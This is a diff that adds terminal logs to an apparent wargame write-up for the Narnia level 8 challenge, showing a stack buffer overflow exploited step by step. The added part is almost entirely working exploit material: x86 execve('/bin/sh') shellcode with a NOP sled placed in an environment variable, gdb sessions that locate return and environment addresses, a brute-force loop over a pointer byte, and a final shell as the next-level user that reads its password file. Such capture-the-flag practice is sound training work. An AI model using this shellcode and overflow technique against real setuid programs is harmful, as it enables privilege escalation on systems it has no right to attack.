@@ -305,5 +305,109 @@ root@kali:~# export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31
 root@kali:~# ./getenvaddress EGG
 EGG found at ffffe74f
 >```
-
-TODO
+```
+narnia8@melinda:/narnia$ export EGG=$(python -c 'print "\x90"*100+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
+narnia8@melinda:/narnia$ gdb narnia8
+(gdb) break * 0x080484a7
+Breakpoint 1 at 0x80484a7
+(gdb) run $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
+Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/20x $esp
+0xffffd5e0:	0x08048580	0xffffd5f8	0x00000014	0xf7e55f53
+0xffffd5f0:	0x00000000	0x00ca0000	0x41414141	0x41414141
+0xffffd600:	0x41414141	0x41414141	0x41414141	0xffff5452
+0xffffd610:	0x00000002	0xffffd6d4	0xffffd638	0x080484cd
+0xffffd620:	0xffffd818	0xf7ffd000	0x080484fb	0xf7fca000
+(gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+>
+Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAARRRR���
+>
+Program received signal SIGSEGV, Segmentation fault.
+0x52525252 in ?? ()
+(gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+>
+Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"RRRR"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/s *((char **)environ)
+0xffffd841:	"XDG_SESSION_ID=107376"
+(gdb) x/s *((char **)environ+1)
+0xffffd857:	"SHELL=/bin/bash"
+(gdb) x/s *((char **)environ+2)
+0xffffd867:	"TERM=xterm"
+(gdb) x/s *((char **)environ+3)
+0xffffd872:	"SSH_CLIENT=68.1.62.184 36662 22"
+(gdb) x/s *((char **)environ+4)
+0xffffd892:	"SSH_TTY=/dev/pts/34"
+(gdb) x/s *((char **)environ+5)
+0xffffd8a6:	"LC_ALL=C"
+(gdb) x/s *((char **)environ+6)
+0xffffd8af:	"EGG=", '\220' <repeats 100 times>, "\061\333\215C\027\231\315\200\061\311Qhn/shh//bi\215A\v\211\343\315\200"
+(gdb) run $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+>
+Starting program: /games/narnia/narnia8 $(python -c 'print "A"*20+"\x18\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA�������
+process 5159 is executing new program: /bin/dash
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x80484a7
+```
+```
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x19\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1a\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1b\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1c\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1d\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1e\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x1f\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAAA��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x20\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA&���
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x21\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA!A��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x22\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA"A��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x23\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA#A��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x24\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA$A��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x25\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA%%��
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xaf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
+Segmentation fault
+```
+```
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xba\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
+Segmentation fault
+narnia8@melinda:/narnia$ ./narnia8 $(python -c 'print "A"*20+"\x26\xd8\xff\xff"+"A"*12+"\xbf\xd8\xff\xff"')
+AAAAAAAAAAAAAAAAAAAA&���AAAAAAAAAAAA����&���
+$ whoami
+narnia9
+$ cat /etc/narnia_pass/narnia9
+**********
+```
